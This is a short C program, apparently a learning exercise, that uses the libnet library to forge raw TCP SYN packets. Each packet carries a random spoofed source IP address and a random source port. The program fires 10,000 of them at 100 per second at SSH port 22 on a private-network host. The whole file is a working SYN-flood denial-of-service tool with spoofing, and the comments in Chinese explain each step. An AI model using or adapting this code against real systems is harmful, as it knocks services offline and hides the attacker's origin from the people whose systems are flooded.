#include <stdio.h>
#include <stdlib.h>

#include <libnet.h>
#include <unistd.h>
#include <time.h>


typedef struct {
    char *src;
    char *dst;

    int sport;
    int dport;

    int controlFlag;

} TcpPack;

void sendSyn(TcpPack *pack) {
    int ret;

    char errBuff[1024];

    // char *src = pack->src;
    char *dst = pack->dst;
    
    // int sport = pack->sport;
    int sport = rand();

    int dport = pack->dport;
    int controlFlag = pack->controlFlag; // 控制符

    char *msg = "";
    int msgLen = strlen( msg);

    // printf("%d\n", msgLen);

    // 初始化
    libnet_t* link = libnet_init(LIBNET_RAW4, NULL, errBuff);
    if (link == NULL ) {
        perror("init: ");
    }
    libnet_ptag_t tag = 0;

    
    int seq = 1234;
    int ack = 0;
    // int  controlFlag = TH_PUSH | TH_ACK; 
    int win = 1024;

    int tcpLen = LIBNET_TCP_H;

    // 构建,tcp包
    libnet_build_tcp(
        sport, dport,

        seq,  ack,

        controlFlag,  win,

        0, 0, tcpLen,
        
        msg, msgLen,
        link, 0);

    // ret = libnet_write(link);
    // printf("发送的长度: %d\n", ret);
    // perror("send: ");
    //  fprintf(stderr, "libnet_write() failed: %s\n", libnet_geterror(link));

    // return;
    // printf("%d\n", LIBNET_TCP_H);
    int ipLen = LIBNET_IPV4_H + LIBNET_TCP_H + msgLen; // ip包头的长度
            // 20 + 20 

    // printf("%d\n", ipLen);

    int ipId = 12345; // ip标识
    int ipPos = 0; // 片偏移

    int ttl = 64;
    int bfProt = IPPROTO_TCP; // 上层协议

    int src = rand();
    // 构建 ipv4 包
    tag = libnet_build_ipv4(
        ipLen, 0,
        ipId, ipPos,
        ttl, bfProt, 0, // 校验和（自动计算）

        src, libnet_name2addr4(link, dst, LIBNET_DONT_RESOLVE) ,
        NULL, 0, // 负载数据为空,  长度为0
        link, 0 
    );

    // 发送数据包
    ret = libnet_write(link);
    printf("发送的长度: %d\n", ret);
    perror("send: ");

    libnet_destroy(link);
}



int main() {
    TcpPack pack;
    
    // pack.src =  "192.168.100.102";
    pack.dst =  "192.168.100.102";
    // pack.sport = 1023;
    pack.dport = 22;

    pack.controlFlag = TH_SYN;
    // int  controlFlag = TH_PUSH | TH_ACK; 

    struct timespec ts;
    ts.tv_sec = 0;
    ts.tv_nsec= 10000000; // 一秒钟100个 ,10000000

    int num = 10000;
    for (int i = 0; i < num; i++) {
        sendSyn(&pack);

        nanosleep(&ts, NULL);

    }

}